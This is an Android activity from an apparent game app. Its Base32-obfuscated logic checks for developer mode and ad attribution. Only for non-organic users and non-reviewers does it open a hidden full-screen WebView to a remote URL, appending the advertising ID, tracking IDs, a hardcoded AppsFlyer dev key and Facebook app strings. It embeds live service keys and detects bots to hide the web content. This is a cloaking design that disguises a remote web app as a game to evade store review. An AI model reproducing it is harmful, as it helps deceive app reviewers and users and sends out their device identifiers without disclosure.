package com.game.colorroll.actJg;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.ViewModelProvider;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.Display;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.applinks.AppLinkData;
import com.game.colorroll.R;
import com.game.colorroll.modJg.FireJg;
import com.game.colorroll.viewmodJg.ViewModJg;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.onesignal.OneSignal;

import org.apache.commons.codec.binary.Base32;

import java.io.IOException;
import java.util.Map;

public class StartActivityJG extends AppCompatActivity {
    public static ViewModJg viewModJg;
    Button buttonStJG, buttonRulJG, buttonCloJG, buttonsettingsJG, buttonrecordJG, buttonIn;
    ImageView image1, image2, image3;
    private Display displayJg;
    boolean fs;
    String AIDJG;
    String apps_idJG;
    String af_statusJG;
    String media_sourceJG;
    String af_channelJG;
    String campaignJG;
    String deepJG = null;
    FireJg fireJG;
    String loadJG;
    public static boolean h = false;
    boolean hh = false;
    WebView webViewFullAppJG;

    String dd;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start_jg);
        viewModJg = new ViewModelProvider.AndroidViewModelFactory(getApplication()).create(ViewModJg.class);
        viewModJg.saveJg(this);
        displayJg = getWindowManager().getDefaultDisplay();
        buttonStJG = findViewById(R.id.buttonStJG);
        buttonRulJG = findViewById(R.id.buttonRulJG);
        buttonCloJG = findViewById(R.id.buttonCloJG);
        buttonsettingsJG = findViewById(R.id.buttonsettingsJG);
        buttonrecordJG = findViewById(R.id.buttonrecordJG);
        viewModJg.setButtonJG(this, buttonStJG, buttonRulJG, buttonCloJG, buttonsettingsJG, buttonrecordJG);
        image1 = findViewById(R.id.image1);
        image2 = findViewById(R.id.image2);
        image3 = findViewById(R.id.image3);
        buttonIn = findViewById(R.id.buttonIn);
        webViewFullAppJG = findViewById(R.id.webViewFullAppJG);
        viewModJg.moveProgJG(image1, image2, image3, displayJg.getWidth());
        viewModJg.setFbSetEG(this);
        setWebJG();
        gdj();
        oneJG();


        Handler handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!h) {
                    handler.postDelayed(this::run, 10);
                } else {
                    ds();
                }
            }
        });

        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!hh) {
                    handler.postDelayed(this::run, 10);
                } else {
                    viewModJg.stopMediaJG();
                    webViewFullAppJG.setVisibility(View.VISIBLE);
                    webViewFullAppJG.loadUrl(dd);
                }
            }
        });




        if (fs) {
            int i = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
            if (i == 0) {

                if (viewModJg.getSaveJ().equals("ggg")) {
                    appJG();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            fireJG = viewModJg.fireJg(StartActivityJG.this);
                        }
                    }).start();
                } else {
                    dd = viewModJg.getSaveJ();
                    hh = true;
                }
            } else {
                h = true;
            }

        } else {

            viewModJg.buttonIntJG(buttonIn, StartActivityJG.this);
            buttonIn.setVisibility(View.VISIBLE);
            image1.setVisibility(View.INVISIBLE);
            image2.setVisibility(View.INVISIBLE);
            image3.setVisibility(View.INVISIBLE);
        }

    }


    public void gdj() {
        String fds = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager cm = (ConnectivityManager) getSystemService(fds);
        if (cm.getActiveNetworkInfo() == null) {
            fs = false;
        } else {
            fs = true;
        }
    }

    public void oneJG() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(getApplicationContext());
        OneSignal.setAppId("cb0bc156-2774-43b0-ac6b-7d370c3250c1");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    AIDJG = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                    Log.d("weq", AIDJG);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesNotAvailableException e) {
                    e.printStackTrace();
                } catch (GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        apps_idJG = AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext());
    }

    public String decodeJG(String hhh) {
        Base32 base32JG = new Base32();
        byte[] decodedBytesJG = base32JG.decode(hhh);
        return new String(decodedBytesJG);
    }


    public void appJG() {
        Log.d("weq", "1");
        AppsFlyerLib.getInstance().init("aPDypBN7xA4HAc4TAD2AUL", new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                Log.d("weq", "22");
                af_statusJG = map.get(decodeJG("MFTF643UMF2HK4Y=")).toString();
                Log.d("weq", map.get(decodeJG("MFTF643UMF2HK4Y=")).toString());
                if (af_statusJG.equals(decodeJG("JZXW4LLPOJTWC3TJMM======"))) {
                    Log.d("weq", af_statusJG);
                    try {
                        campaignJG = map.get(decodeJG("MNQW24DBNFTW4===")).toString();
                    } catch (Exception e) {

                    }

                    try {
                        media_sourceJG = map.get(decodeJG("NVSWI2LBL5ZW65LSMNSQ====")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        af_channelJG = map.get(decodeJG("MFTF6Y3IMFXG4ZLM")).toString();
                    } catch (Exception e) {

                    }

                    parseJG(campaignJG);

                } else {
                    deeplinkJG();

                }
            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        }, this);
        AppsFlyerLib.getInstance().start(this);
    }

    public void deeplinkJG() {
        AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                if (appLinkData == null) {
                    appLinkData = AppLinkData.createFromActivity(StartActivityJG.this);

                }
                if (appLinkData != null) {

                    String[] csaaa = appLinkData.getTargetUri().toString().split("://");
                    deepJG = csaaa[1];
                    Log.d("weq", "dep");
                    parseJG(deepJG);

                } else {

                    organicJG();

                }
            }
        });
    }


    public void organicJG() {

        String sas = fireJG.getStatusJG();
        if (sas.equals("0")) {
            h = true;

        } else {

            String[] usgs = {decodeJG("EZRWC3LQMFUWO3R5"), decodeJG("EZTW633HNRSV6YLENFSD2==="), decodeJG("EZQWMX3VONSXE2LEHU======"), decodeJG("EZQWMX3DNBQW43TFNQ6Q===="), decodeJG("EZSGK5S7NNSXSPI="), decodeJG("EZRHK3TENRST2==="), decodeJG("EZTGEX3BOBYF62LEHU======"), decodeJG("EZTGEX3BOQ6Q====")};
            String google_adidAps = usgs[1] + AIDJG;
            String af_useridAps = usgs[2] + apps_idJG;
            String af_channelAps = usgs[3] + af_channelJG;
            String dev_keyAps = usgs[4] + "aPDypBN7xA4HAc4TAD2AUL";
            String bundleAps = usgs[5] + getPackageName();
            String fb_app_idAps = usgs[6] + getResources().getString(R.string.ff);
            String fb_atAps = usgs[7] + getResources().getString(R.string.tt);
            loadJG = decodeJG("H5WWKZDJMFPXG33VOJRWKPLPOJTWC3TJMM======") + google_adidAps + af_useridAps
                    + af_channelAps + dev_keyAps + bundleAps + fb_app_idAps + fb_atAps;
            hh = true;
            dd = fireJG.getUrlJG() + loadJG;
            viewModJg.saveJ(dd);
            Log.d("weq", dd);
        }
    }

    public void parseJG(String s) {
        String[] fdz = s.split("_");
        String[] dd = {decodeJG("EZZXKYRRHU======"), decodeJG("EZZXKYRSHU======"), decodeJG("EZZXKYRTHU======"), decodeJG("EZZXKYRUHU======"), decodeJG("EZZXKYRVHU======"), decodeJG("EZZXKYRWHU======"), decodeJG("EZZXKYRXHU======"), decodeJG("EZZXKYRYHU======"), decodeJG("EZZXKYRZHU======"), decodeJG("EZZXKYRRGA6Q====")};

        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < dd.length; i++) {
            try {
                stringBuilder.append(dd[i]);
                stringBuilder.append(fdz[i]);
            } catch (Exception e) {

            }

        }
        ic(stringBuilder.toString());

    }

    public void ic(String sss) {
        String[] usgs = {decodeJG("EZRWC3LQMFUWO3R5"), decodeJG("EZTW633HNRSV6YLENFSD2==="), decodeJG("EZQWMX3VONSXE2LEHU======"), decodeJG("EZQWMX3DNBQW43TFNQ6Q===="), decodeJG("EZSGK5S7NNSXSPI="), decodeJG("EZRHK3TENRST2==="), decodeJG("EZTGEX3BOBYF62LEHU======"), decodeJG("EZTGEX3BOQ6Q====")};

        try {
            String campaignAps = usgs[0] + campaignJG;
            String google_adidAps = usgs[1] + AIDJG;
            String af_useridAps = usgs[2] + apps_idJG;
            String af_channelAps = usgs[3] + af_channelJG;
            String dev_keyAps = usgs[4] + "aPDypBN7xA4HAc4TAD2AUL";
            String bundleAps = usgs[5] + getPackageName();
            String fb_app_idAps = usgs[6] + getResources().getString(R.string.ff);
            String fb_atAps = usgs[7] + getResources().getString(R.string.tt);
            loadJG = decodeJG("H5WWKZDJMFPXG33VOJRWKPI=") + media_sourceJG + sss
                    + campaignAps + google_adidAps + af_useridAps + af_channelAps + dev_keyAps + bundleAps + fb_app_idAps + fb_atAps;
        } catch (Exception e) {

        }
        dd = fireJG.getUrlJG() + loadJG;
        viewModJg.saveJ(dd);
        Log.d("weq", dd);
        hh = true;

    }

    public void ds() {
        image1.setVisibility(View.INVISIBLE);
        image2.setVisibility(View.INVISIBLE);
        image3.setVisibility(View.INVISIBLE);
        buttonStJG.setVisibility(View.VISIBLE);
        buttonRulJG.setVisibility(View.VISIBLE);
        buttonCloJG.setVisibility(View.VISIBLE);
        buttonsettingsJG.setVisibility(View.VISIBLE);
        buttonrecordJG.setVisibility(View.VISIBLE);
    }

    @Override
    public void onBackPressed() {
        if (webViewFullAppJG.isFocused() && webViewFullAppJG.canGoBack()) {
            webViewFullAppJG.goBack();
        }
    }

    @Override
    protected void onActivityResult(int gfee, int uygb, @Nullable Intent uygg) {
        if (gfee != kjhhh || vvvvfd == null) {
            super.onActivityResult(gfee, uygb, uygg);
            return;
        }
        Uri[] vdgrw = null;
        if (uygb == Activity.RESULT_OK) {
            if (uygg == null) {
                if (nnjnj != null) {
                    vdgrw = new Uri[]{Uri.parse(nnjnj)};
                }
            } else {
                String jute = uygg.getDataString();
                if (jute != null) {
                    vdgrw = new Uri[]{Uri.parse(jute)};
                }
            }
        }
        vvvvfd.onReceiveValue(vdgrw);
        vvvvfd = null;
        if (uuiut == null) {
            super.onActivityResult(gfee, uygb, uygg);
            return;
        }
        Uri uygd = null;
        try {
            if (uygb != RESULT_OK) {
                uygd = null;
            } else {
                uygd = uygg == null ? aaasa : uygg.getData();
            }
        } catch (Exception e) {
        }
        uuiut.onReceiveValue(uygd);
        uuiut = null;
    }

    public static ValueCallback<Uri> uuiut;
    public static Uri aaasa = null;
    public static ValueCallback<Uri[]> vvvvfd;
    public static String nnjnj;
    public static final int kjhhh = 1;

    public void setWebJG() {
        webViewFullAppJG.getSettings().setAllowContentAccess(true);
        webViewFullAppJG.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewFullAppJG.getSettings().setSupportMultipleWindows(false);
        webViewFullAppJG.getSettings().setBuiltInZoomControls(true);
        webViewFullAppJG.getSettings().setUseWideViewPort(true);
        webViewFullAppJG.getSettings().setAppCacheEnabled(true);
        webViewFullAppJG.getSettings().setDisplayZoomControls(false);
        webViewFullAppJG.getSettings().setAllowFileAccess(true);
        webViewFullAppJG.getSettings().setLightTouchEnabled(true);
        webViewFullAppJG.getSettings().setJavaScriptEnabled(true);
        webViewFullAppJG.getSettings().setDomStorageEnabled(true);
        webViewFullAppJG.clearCache(false);
        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webViewFullAppJG, true);
        webViewFullAppJG.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(WebView view,
                                             ValueCallback<Uri[]> ccs,
                                             FileChooserParams ccsj) {
                if (vvvvfd != null) {
                    vvvvfd.onReceiveValue(null);
                }
                vvvvfd = ccs;
                Intent xxxx = new Intent(Intent.ACTION_GET_CONTENT);
                xxxx.addCategory(Intent.CATEGORY_OPENABLE);
                xxxx.setType("*/*");
                Intent[] vvvv = new Intent[0];
                Intent zzzzz = new Intent(Intent.ACTION_CHOOSER);
                zzzzz.putExtra(Intent.EXTRA_INTENT, xxxx);
                zzzzz.putExtra(Intent.EXTRA_TITLE, decodeJG("KNSWYZLDOQQE64DUNFXW4OQ="));
                zzzzz.putExtra(Intent.EXTRA_INITIAL_INTENTS, vvvv);
                startActivityForResult(zzzzz, 1);
                return true;
            }
        });
        webViewFullAppJG.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);

                if (url.contains(decodeJG("MVZHE33SHVQXA4DBMZAXGM3G")) || url.contains(decodeJG("MRUXGYLCNRSWILTIORWWY==="))) {
                    webViewFullAppJG.setVisibility(View.INVISIBLE);
                    h = true;
                    Log.d("weq", "bot");
                }
            }
        });
    }
}